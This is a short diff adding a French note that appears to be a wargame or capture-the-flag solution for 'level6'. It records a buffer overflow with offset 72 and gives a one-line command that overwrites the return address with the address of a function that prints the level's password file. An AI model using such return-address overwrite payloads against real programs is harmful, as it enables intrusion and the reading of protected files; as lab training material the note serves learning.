@@ -1,0 +1,8 @@
+ez
+
+buffer overflow level -1
+offset = 72
+on ecrase la return value avec 0x08048454
+adresse de n() qui cat le .pass
+
+./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')
